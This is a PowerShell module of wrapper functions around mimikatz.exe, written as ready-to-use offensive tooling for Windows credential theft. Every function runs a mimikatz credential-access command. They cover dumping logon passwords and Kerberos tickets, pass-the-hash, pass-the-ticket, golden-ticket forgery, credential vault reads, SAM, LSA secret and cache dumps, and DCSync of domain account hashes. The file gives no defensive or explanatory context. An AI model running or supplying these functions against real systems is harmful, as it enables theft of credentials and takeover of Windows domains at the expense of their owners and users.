

function Get-MKLogonPassword {
    .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
}

function Get-MKTicket {
    param(
        [Parameter()]
        [Switch]$Export
    )

    $ExportSwitch = ""
    if ($Export) {
        $ExportSwitch = " /export"
    }

    .\mimikatz.exe privilege::debug "sekurlsa::tickets$ExportSwitch" exit
}

function Invoke-MKPassTheHash {
    param(
        [Parameter(Mandatory)] 
        [string]$User,
        [Parameter(Mandatory)]
        [string]$Domain,
        [Parameter(Mandatory)]
        [string]$NtlmHash,
        [Parameter()]
        [string]$Command = 'powershell'    
        )

    .\mimikatz.exe privilege::debug "sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NtlmHash /run:$Command" exit
}

function Get-MKKerberosTicket {
    param(
        [Parameter()]
        [Switch]$Export
    )

    $ExportSwitch = ""
    if ($Export) {
        $ExportSwitch = " /export"
    }

    .\mimikatz.exe privilege::debug "kerberos::list$ExportSwitch" exit
}

function Export-MKKerberosTicket {
    param(
        [Parameter(Mandatory)]
        [string]$FilePath
    )

    .\mimikatz.exe privilege::debug "kerberos::ptt $FilePath" exit
}

function Grant-MKKerberosGoldenTicket {
    param(
        [Parameter(Mandatory)]
        [string]$Administrator,
        [Parameter(Mandatory)]
        [string]$Domain,
        [Parameter(Mandatory)]
        [string]$Sid,
        [Parameter(Mandatory)]
        [string]$KrbtgtNtlmHash,
        [Parameter(Mandatory)]
        [string]$TicketPath
    )

    if (-not (Test-Path $TicketPath)) {
        throw "Could not find ticket '$TicketPath'"
    }

    .\mimikatz.exe privilege::debug "kerberos::golden /admin:$Administrator /domain:$Domain /sid:$Sid /krbtgt:$KrbtgtNtlmHash /ticket:$TicketPath" exit
}

function Get-MKCredentialVaultCredential {
    .\mimikatz.exe privilege::debug token::elevate vault::cred exit
}

function Get-MKCredentialVault {
    .\mimikatz.exe privilege::debug token::elevate vault::list exit
}

function Get-MKLsaSam {
    .\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
}

function Get-MKLsaSecret {
    .\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
}

function Get-MKLsaCache {
    .\mimikatz.exe privilege::debug token::elevate lsadump::cache exit
}

function Invoke-MKDcSync {
    param(
        [Parameter(Mandatory)]
        [string]$UserName,
        [Parameter(Mandatory)]
        [string]$Domain
    )

    .\mimikatz.exe privilege::debug token::elevate "lsadump::dcsync /user:$UserName /domain:$Domain" exit
}